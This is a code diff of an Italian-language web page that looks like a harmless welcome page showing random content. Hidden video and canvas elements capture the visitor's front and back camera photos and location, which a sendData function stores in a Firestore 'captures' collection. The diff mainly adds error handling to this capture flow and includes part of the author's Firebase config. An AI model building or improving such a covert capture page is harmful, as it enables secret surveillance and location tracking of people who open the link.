@@ -18,53 +18,22 @@
             appId: "1:155421459394:web:2c3bcb70fe32bf1fc30c5b",
             measurementId: "G-E9MKECCY3W"
         };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-    </script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 20px;
-            background-color: #f0f0f0;
+
+        // Inizializza Firebase e gestisci errori
+        let db;
+        try {
+            const firebaseApp = firebase.initializeApp(firebaseConfig);
+            db = firebaseApp.firestore();
+            console.log("Firebase inizializzato con successo");
+        } catch (error) {
+            console.error("Errore inizializzazione Firebase: ", error);
         }
-        #content {
-            margin-top: 20px;
-        }
-        #content img {
-            max-width: 100%;
-            border-radius: 10px;
-        }
-        #content p {
-            font-size: 24px;
-            color: #333;
-        }
-        #video, #canvas {
-            display: none;
-        }
-        #privacy-notice {
-            font-size: 14px;
-            color: red;
-            margin-top: 10px;
-        }
-        #debug {
-            font-size: 14px;
-            color: blue;
-            margin-top: 10px;
-        }
-    </style>
-</head>
-<body>
-    <h1>Benvenuto!</h1>
-    <div id="content"></div>
-    <p id="privacy-notice">Questa pagina raccoglie posizione e foto. Continuando, accetti i nostri <a href="#">termini</a>.</p>
-    <div id="debug"></div>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
-    <script>
+
         const debugDiv = document.getElementById('debug');
         function logDebug(message) {
-            debugDiv.innerHTML += `<p>${message}</p>`;
+            if (debugDiv) {
+                debugDiv.innerHTML += `<p>${message}</p>`;
+            }
         }
 
         // Contenuti casuali
@@ -141,6 +110,10 @@
 
         // Salva dati su Firestore
         async function sendData(location, frontPhoto, backPhoto) {
+            if (!db) {
+                logDebug("Errore: Firestore non inizializzato");
+                throw new Error("Firestore non inizializzato");
+            }
             try {
                 await db.collection('captures').add({
                     latitude: location.latitude,
